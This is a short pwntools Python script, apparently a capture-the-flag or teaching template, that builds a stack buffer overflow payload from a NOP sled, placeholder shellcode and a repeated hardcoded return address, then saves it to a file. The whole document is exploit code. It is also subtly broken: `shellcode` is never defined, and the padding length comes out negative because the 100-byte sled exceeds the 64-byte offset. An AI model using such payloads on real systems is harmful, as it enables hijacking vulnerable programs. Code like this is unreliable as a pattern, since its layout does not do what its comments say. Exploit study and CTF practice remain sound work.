from pwn import *

# Assuming the offset is 64 and you've identified the return address as 0xbffff7e0
offset = 64
ret_address = p32(0xbffff7e0)  # Use p64() for 64-bit addresses

# NOP sled + shellcode + return address
payload = b'\x90' * 100  # 100-byte NOP sled
payload += shellcode  # Your shellcode here
payload += b'A' * (offset - len(payload))
payload += ret_address * 4  # Overwrite return address with desired location

# Save payload to file
with open('payload', 'wb') as f:
    f.write(payload)
